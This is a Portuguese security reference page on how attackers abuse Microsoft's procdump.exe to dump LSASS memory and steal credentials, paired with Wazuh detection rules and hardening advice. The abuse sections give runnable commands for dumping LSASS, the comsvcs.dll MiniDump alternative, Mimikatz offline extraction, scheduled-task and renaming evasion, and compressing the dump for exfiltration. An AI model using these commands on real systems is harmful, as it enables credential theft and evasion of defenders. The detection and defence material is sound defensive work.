# procdump.exe

**Plataforma:** Windows

**Categorias:** Dump de memória, Exfiltração de credenciais, Coleta de dados

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping — LSASS Memory)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/OtherMSTools/Procdump/

---

## O que é o procdump.exe

O procdump.exe faz parte do pacote Sysinternals da Microsoft. Foi criado para capturar dumps de memória de processos que estão consumindo CPU excessiva, travando ou apresentando comportamento anômalo — um diagnóstico clássico de suporte técnico e desenvolvimento. Ele precisa de privilégios de administrador local para capturar dumps de processos do sistema.

O fato de ser uma ferramenta assinada pela Microsoft é central para seu valor ofensivo: ferramentas de segurança endpoint que verificam assinatura digital de binários não o bloqueiam por padrão, e defensores que veem o nome "Sysinternals" associado a uma ferramenta tendem a dar o benefício da dúvida.

---

## Por que atacantes usam o procdump

O processo LSASS (Local Security Authority Subsystem Service) mantém em memória as credenciais de todos os usuários que fizeram login na máquina — hashes NTLM, tickets Kerberos e, dependendo da configuração, senhas em texto claro. Um dump de memória do LSASS captura tudo isso em um arquivo que pode ser processado offline com ferramentas como Mimikatz.

A alternativa clássica para dump do LSASS é o próprio Mimikatz com `sekurlsa::logonpasswords`, mas ele é extremamente bem detectado por EDRs modernos. O procdump oferece uma rota alternativa: é assinado pela Microsoft, tem uso legítimo documentado, e a operação de dump pode ser feita sem executar código no contexto do LSASS — apenas lendo sua memória.

---

## Técnicas de abuso

### Dump básico do LSASS

```cmd
:: Dump de memória do processo LSASS por nome
procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp

:: Dump usando o PID (para evitar referência ao nome lsass)
:: Primeiro, descobrir o PID
tasklist /fi "imagename eq lsass.exe"
procdump.exe -ma <PID> C:\Windows\Temp\memoria.dmp

:: Dump com flag -accepteula (evita o prompt de licença que gera evento no EventLog)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### Processamento offline com Mimikatz

```
:: Na máquina do atacante (com o arquivo .dmp transferido)
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Dump via tarefa agendada (para evitar detecção por processo pai)

```powershell
# Criar tarefa agendada que executa o procdump e grava o dump
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\procdump.exe" `
    -Argument "-accepteula -ma lsass C:\Windows\Temp\out.dmp"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
Register-ScheduledTask -TaskName "WinDiag" -Action $action -Trigger $trigger -RunLevel Highest
Start-Sleep -Seconds 10
Unregister-ScheduledTask -TaskName "WinDiag" -Confirm:$false
```

### Dump via comsvcs.dll (alternativa sem procdump)

Quando o procdump não pode ser copiado para o alvo, o `comsvcs.dll` nativo do Windows oferece o mesmo resultado via MiniDump:

```powershell
# Usando rundll32 com comsvcs.dll (sem precisar do procdump)
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full
```

---

## Técnicas de bypass e evasão

### Renomear o binário

```cmd
:: Renomear para confundir detecções baseadas em nome de processo
copy procdump.exe C:\Windows\Temp\windiag.exe
C:\Windows\Temp\windiag.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### Dump comprimido e fragmentado para exfiltração

```powershell
# Comprimir e dividir o dump para exfiltração furtiva
Compress-Archive -Path C:\Windows\Temp\lsass.dmp -DestinationPath C:\Windows\Temp\diag.zip
# Transferir via certutil, bitsadmin ou curl
certutil -encode C:\Windows\Temp\diag.zip C:\Windows\Temp\diag.b64
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- Qualquer processo acessando a memória do LSASS (Sysmon Event ID 10 — ProcessAccess com TargetImage=lsass.exe)
- procdump.exe ou variante com argumento `lsass` ou PID do lsass
- Criação de arquivos `.dmp` em diretórios temporários (Sysmon Event ID 11)
- Execução do procdump.exe por processo pai incomum (não SYSTEM, não winlogon)
- Dump de LSASS via comsvcs.dll (rundll32 + MiniDump)

**Indicadores de média relevância:**

- procdump.exe com argumento `-ma` aplicado a processos de sistema
- Transferência de arquivos `.dmp` via rede logo após a criação
- Execução de procdump.exe fora de horário comercial ou por conta de usuário comum

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0203-lolbas_dump.xml -->

<!-- procdump acessando LSASS -->
<rule id="100341" level="15">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2" negate="no">(?i)procdump(64)?\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(lsass|sekurlsa|minidump)</field>
  <description>procdump executando dump do processo LSASS — possivel coleta de credenciais em memoria</description>
  <mitre>
    <id>T1003.001</id>
  </mitre>
</rule>

<!-- Qualquer processo acessando memória do LSASS (Sysmon Event 10) -->
<rule id="100342" level="14">
  <field name="win.system.eventID">10</field>
  <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe</field>
  <field name="win.eventdata.sourceImage" type="pcre2" negate="yes">(?i)(svchost|MsMpEng|csrss|wininit|winlogon|werfault|taskmgr)\.exe</field>
  <description>Acesso a memoria do processo LSASS por processo nao esperado — possivel coleta de credenciais</description>
  <mitre>
    <id>T1003.001</id>
  </mitre>
</rule>

<!-- Criação de arquivo .dmp em diretório temporário -->
<rule id="100343" level="12">
  <field name="win.system.eventID">11</field>
  <field name="win.eventdata.targetFilename" type="pcre2">(?i)(\\Temp\\|\\Windows\\Temp\\|\\AppData\\).*\.dmp$</field>
  <description>Arquivo .dmp criado em diretorio temporario — possivel dump de processo para exfiltracao</description>
  <mitre>
    <id>T1003.001</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Suporte técnico e diagnóstico de crash:** a função primária do procdump é diagnóstico de processos problemáticos. Dumps gerados automaticamente pelo Windows Error Reporting (WER) são comuns e legítimos. A distinção relevante é: dump do LSASS especificamente, não de outros processos.

**Software de monitoramento:** algumas soluções de APM e monitoramento capturam dumps periódicos de processos. Filtre por processo alvo — qualquer dump do lsass.exe é incomum e deve ser investigado independentemente da ferramenta.

---

## Proteção e controles defensivos

**Habilitar Credential Guard:** o Credential Guard (disponível no Windows 10 e Windows Server 2016+) isola o processo LSASS em um ambiente virtualizado, impedindo que dumps de memória retornem credenciais úteis mesmo que o dump seja bem-sucedido. É a proteção mais eficaz contra essa técnica.

**Configurar ASR Rule para bloqueio de acesso ao LSASS:** a regra `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0` (Block credential stealing from the Windows local security authority subsystem) bloqueia acesso à memória do LSASS por processos não confiáveis.

**Habilitar PPL (Protected Process Light) para o LSASS:** no Windows 8.1+, o LSASS pode ser configurado como Protected Process Light via chave de registro, exigindo drivers assinados para acesso à sua memória.

---

## Referências

- LOLBAS — procdump: https://lolbas-project.github.io/lolbas/OtherMSTools/Procdump/
- MITRE ATT&CK T1003.001: https://attack.mitre.org/techniques/T1003/001/
- Microsoft Credential Guard: https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
